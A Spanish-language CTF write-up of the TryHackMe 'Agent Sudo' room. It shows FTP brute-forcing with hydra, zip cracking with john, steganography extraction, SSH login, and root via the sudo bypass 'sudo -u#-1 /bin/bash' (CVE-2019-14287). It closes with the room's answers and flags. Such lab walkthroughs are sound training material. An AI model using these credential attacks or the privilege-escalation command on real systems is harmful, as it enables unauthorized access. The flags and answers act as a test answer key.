---
layout: single
title: Agent Sudo - TryHackMe
excerpt: "Agent Sudo es un CTF de dificultad facil en el que tendremos que hacer fuerza bruta para poder saber la contraseña de un usuario de la maquina y poder acceder al servicio ftp ademas tendremos que usar el User-Agent para poder enumerar bien y encontrar mucha informacion util ya que esto nos permitira encontrar mas pistas para avanzar y poder comprometer la maquina para ser root es facil en el CTF nos dicen que tenemos que revelar la verdad"
date: 2023-02-18
classes: wide
header:
  teaser: /assets/images/try-writeup-agentsudo/agentsudo.jpeg
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
  - infosec
tags:  
  - User-Agent
  - CVE-2019-14287
---
![](/assets/images/try-writeup-agentsudo/agentsudo.jpeg)

## PortScan

```ruby
❯ sudo nmap -sCV -p21,22,80 10.10.246.3 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 19:26 CST
Nmap scan report for 10.10.246.3
Host is up (0.36s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.07 seconds
```

## Enumeration

```ruby
❯ whatweb http://10.10.246.3
http://10.10.246.3 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.246.3], Title[Annoucement]
```

Asi es como esta la pagina web

![](/assets/images/try-writeup-agentsudo/Web.png)

Bueno en la web nos dice sobre el user agent asi que vamos a capturar la peticion con `burpsuite` para ver eso

Si ponemos la letra R en el user agent nos da esta respuesta 

![](/assets/images/try-writeup-agentsudo/useragentr.png)

Si seguimos poniendo letras cuando llegamos ala letra R y hacemos un follow redirection nos da este mensaje basicamente en la web nos estan diciendo que en el user-agent hay que poner nuesto codename al probar con letras nos damos cuenta que funciona y ese podria ser el identificador de varios agentes.

Si ponemos la letra C nos da esta respuesta

![](/assets/images/try-writeup-agentsudo/letrac.png)

Como sabemos que hay una ruta existente podemos ver que es lo que hay `agent_C_attention.php` es lo mismo que en burpsuite por que es la misma ruta

![](/assets/images/try-writeup-agentsudo/ruta.png)

Podemos ver que dice que recuerda nuestro trato de decirle al agent `J` al parecer hay varios agentes y los identifican por una letra al final le dice que cambie su contraseña por que es debil

Hay que recordar que el servicio `ftp` esta abierto asi que podemos hacer fuerza bruta con  `hydra` tenemos un usuario `chris` y como le estan diciendo que su contraseña es debil lo mas probable es que este en el `rockyou.txt`

Tenemos la contraseña

![](/assets/images/try-writeup-agentsudo/contraseña.png)

`chris:crystal`

Podemos conectarnos al servicio ftp y vemos estos archivos vamos a traer los archivos a nuestra maquina de atacante

```shell
❯ ftp 10.10.246.3
Connected to 10.10.246.3.
220 (vsFTPd 3.0.3)
Name (10.10.246.3:miguelrega7): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> 
```

```shell
ftp> mget *
mget To_agentJ.txt? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (96.4122 kB/s)
mget cute-alien.jpg? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 1.96 secs (16.5509 kB/s)
mget cutie.png? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.56 secs (60.8779 kB/s)
ftp> 
```

Bueno tenemos 3 archivos vamos a ver que es lo que tiene

```shell
❯ exiftool cute-alien.jpg
ExifTool Version Number         : 12.16
File Name                       : cute-alien.jpg
Directory                       : .
File Size                       : 32 KiB
File Modification Date/Time     : 2023:02:17 20:08:25-06:00
File Access Date/Time           : 2023:02:17 20:08:23-06:00
File Inode Change Date/Time     : 2023:02:17 20:08:25-06:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 440
Image Height                    : 501
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 440x501
Megapixels                      : 0.220
```

```shell
❯ exiftool cutie.png
ExifTool Version Number         : 12.16
File Name                       : cutie.png
Directory                       : .
File Size                       : 34 KiB
File Modification Date/Time     : 2023:02:17 20:08:27-06:00
File Access Date/Time           : 2023:02:17 20:08:27-06:00
File Inode Change Date/Time     : 2023:02:17 20:08:27-06:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 528
Image Height                    : 528
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 762 bytes, use -b option to extract)
Transparency                    : (Binary data 42 bytes, use -b option to extract)
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 528x528
Megapixels                      : 0.279
```

Hay una carta del agente `C` y dice que las fotos de los alien son falsas que la real esta dentro del directorio de `J`

```
❯ /bin/cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Vemos que la foto `cutie.png` tiene mas informacion vamos a usar otra herramienta para obtener mas informacion vemos que hay un archivo `zip` pero esta encriptado


```shell
❯ binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

Vamos a traernos el `zip` encriptado a nuestra maquina de atacante al hacer esto nos creo una carpeta

```shell
❯ sudo binwalk cutie.png -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

```shell
❯ ls
 365   365.zlib   8702.zip   To_agentR.txt
```

Por el momento el archivo `To_agentR.txt` esta vacio asi que vamos a usar john para crackear el archivo `.zip`

```shell
❯ zip2john 8702.zip > xd.txt
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type

❯ /bin/cat xd.txt
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
```

Tenemos la contraseña

```shell
❯ john -w:/usr/share/wordlists/rockyou.txt xd.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2023-02-17 20:19) 2.702g/s 66421p/s 66421c/s 66421C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

`alien`

Ahora podemos ver que el contenido del comprimido

```shell
❯ 7z e 8702.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 06:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 06:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

                    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
❯ ls
 365   365.zlib   8702.zip   To_agentR.txt   xd.txt
❯ /bin/cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Ahora dice que tenemos que enviar una foto vamos a `decodear` esa cadena para ver que dice

```shell
❯ echo -n 'QXJlYTUx' | base64 --decode
Area51# 
```

Hay que recordar que queda una imagen y es `cute-alien.jpg` despues de poner la contraseña nos da un `message.txt`

```shell
❯ steghide extract -sf cute-alien.jpg
Anotar salvoconducto: 
anot los datos extrados e/"message.txt".
```

Tenemos credenciales podemos conectarnos por `SSH` para ver si funcionan

```shell
❯ /bin/cat message.txt
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

`james:hackerrules!`

Ahora podemos conectarnos por `SSH`

```shell
❯ ssh james@10.10.246.3
The authenticity of host '10.10.246.3 (10.10.246.3)' can't be established.
ECDSA key fingerprint is SHA256:yr7mJyy+j1G257OVtst3Zkl+zFQw8ZIBRmfLi7fX/D8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.246.3' (ECDSA) to the list of known hosts.
james@10.10.246.3's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Feb 18 02:51:14 UTC 2023

  System load:  0.0               Processes:           97
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 33%               IP address for eth0: 10.10.246.3
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ whoami
james
james@agent-sudo:~$ 
```

Vemos la user flag

```
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
james@agent-sudo:~$ 
```

Para contestar una pregunta que dice que cual es el incidente de la foto tenemos que pasarla a nuestra maquina de atacante

```shell
❯ scp james@10.10.246.3:Alien_autospy.jpg ~/
james@10.10.246.3's password: 
Alien_autospy.jpg                                                                             
```

Bueno al ver la imagen bueno no es necesario buscarla en google yo se de que trata y es sobre `Roswell alien autopsy`

![](/assets/images/try-writeup-agentsudo/alien.png)

## Root

Una formal altenartiva de hacer la maquina es usando este script que desarrollo s4vitar y su compañero vowkin

```shell
❯ searchsploit lxd
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
Ubuntu 18.04 - 'lxd' Privilege Escalation                                                     | linux/local/46978.sh
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Pero lo haremos de otra forma al ver esto nos damos cuenta que puedes usar el script por que estamos en el grupo `lxd`

```shell
james@agent-sudo:~$ id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ 
```

Si investigamos hay un CVE 
<https://www.exploit-db.com/exploits/47502>

Esto no tiene mayor dificultadad 

```
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# whoami
root
root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:/root# 
```

![](/assets/images/try-writeup-agentsudo/listo.png)

Si quieres ver como ser root usando el `lxd` puedes ver videos directamente del creador explicando como se hace
<https://github.com/s4vitar>

## Preguntas Enumerate

`How many open ports: 3`

`How you redirect yourself to a secret page?: user-agent`

`What is the agent name?: chris`

## Hash cracking and brute-force

`FTP password: crystal`

`Zip file password: alien`

`steg password: area51`

`Who is the other agent (in full name)?: James`

`SSH password: hackerrules`

`What is the user flag?: b03d975e8c92a7c04146cfa7a5a313c7`

`What is the incident of the photo called?: Roswell alien autopsy`

## Privilege escalation

`(Format: CVE-xxxx-xxxx): CVE-2019-14287`

`What is the root flag?: b53a02f55b57d4439e3341834d70c062`

`(Bonus) Who is Agent R?: DesKel`

























